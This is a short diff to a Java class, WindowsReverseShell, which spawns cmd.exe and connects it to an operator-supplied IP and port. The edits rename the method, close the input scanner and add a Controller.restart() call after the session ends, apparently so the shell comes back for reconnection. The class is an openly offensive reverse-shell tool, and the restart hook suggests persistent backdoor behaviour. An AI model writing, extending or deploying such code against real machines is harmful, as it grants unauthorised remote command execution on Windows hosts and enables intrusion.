@@ -9,7 +9,7 @@ import controller.Controller;
 
 public class WindowsReverseShell {
 
-	public static void WindowsReverseShell(int port, String ip) throws Exception {
+	public static void windowsReverseShell(int port, String ip) throws Exception {
 	    String host=ip;
 	    //int port=9999;
 	    String cmd="cmd.exe";
@@ -36,6 +36,7 @@ public class WindowsReverseShell {
 	    };
 	    p.destroy();
 	    s.close();
+		Controller.restart();
 	  }
 	public static void main(String[] args) throws Exception 
 	{
@@ -44,7 +45,8 @@ public class WindowsReverseShell {
 	String ip = inputScanner.nextLine();
 	System.out.println("Please input the listening port");
 	int port = Integer.parseInt(inputScanner.nextLine());	//int x = Integer.parseInt(input);
-	WindowsReverseShell(port, ip);
+	windowsReverseShell(port, ip);
+	inputScanner.close();
 	}
 }
 
